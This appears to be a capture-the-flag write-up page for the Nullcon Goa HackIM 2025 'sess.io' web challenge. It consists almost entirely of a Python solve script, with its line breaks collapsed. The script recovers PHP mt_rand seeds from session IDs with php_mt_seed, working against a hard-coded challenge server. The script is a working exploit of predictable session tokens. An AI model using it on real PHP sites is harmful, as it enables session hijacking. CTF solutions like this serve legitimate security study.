---
title: "sess.io - Nullcon Goa HackIM 2025 CTF"
category: "web"
type: "writeup"
tags: ["web", "sess", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "import requests import hashlib import random import string import os import re ALPHA = \"abcdefghijklmnopqrstuvwxyz0123456789-\" TARGETURL = \"http://52.59.124.14:5008/\" def generaterandomstring(): retur"
source:
  name: "CTFtime writeup #39977"
  url: "https://ctftime.org/writeup/39977"
original_source: "https://hackmd.io/@MnZaZUYBR32K0Fourl72wA/H11u5k8t1x"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "sess.io"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** sess.io
- **Author team:** volticks_fanClub
- **CTFtime:** <https://ctftime.org/writeup/39977>
- **Original writeup:** <https://hackmd.io/@MnZaZUYBR32K0Fourl72wA/H11u5k8t1x>

---
import requests import hashlib import random import string import os import re ALPHA = "abcdefghijklmnopqrstuvwxyz0123456789_-" TARGET_URL = "http://52.59.124.14:5008/" def generate_random_string(): return ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=2)) def get_character(i): while True: random_str = generate_random_string() md5_hash = hashlib.md5(random_str.encode()).hexdigest() if md5_hash[0] == str(i): return random_str return None def get_session(user,pw): data = { 'username': user, 'password': pw, } response = requests.post(TARGET_URL, data=data, verify=False) return response.cookies['PHPSESSID'] flag = b'' for i in range(0,5): id = get_character(i) user = id[0] pw = id[1] sess = get_session(user,pw) num = '' for i in sess: num+=' '+str(ALPHA.index(i))+' '+str(ALPHA.index(i))+' 0 '+str(len(ALPHA)-1) command = ['/home/wh1t3r0se/Tools/php_mt_seed/php_mt_seed'] args = num[1:].split(' ')[0:4*10] command.extend(args) # Run the command seed = os.popen(' '.join(command)+' 2>&1').read() #print('s',seed) test = re.findall(r'seed = (0x[0-9A-Fa-f]+) = \d+',seed) flag+=bytes.fromhex(test[0][2:]) print(flag)

×

### Sign in

or

[ ![](https://hackmd.io/social/google.svg) Sign in via Google  ](https://hackmd.io/auth/google) [ ![](https://hackmd.io/social/facebook.svg) Sign in via Facebook  ](https://hackmd.io/auth/facebook) [ ![](https://hackmd.io/social/x.svg) Sign in via X(Twitter)  ](https://hackmd.io/auth/twitter) [ ![](https://hackmd.io/social/github.svg) Sign in via GitHub  ](https://hackmd.io/auth/github) [ ![](https://hackmd.io/social/dropbox.svg) Sign in via Dropbox  ](https://hackmd.io/auth/dropbox) ![](https://hackmd.io/images/wallet.svg) Sign in with Wallet  Wallet (  )  __ Connect another wallet  Continue with a different method 

New to HackMD? [Sign up](https://hackmd.io/join)

By signing in, you agree to our [terms of service](https://hackmd.io/s/terms).
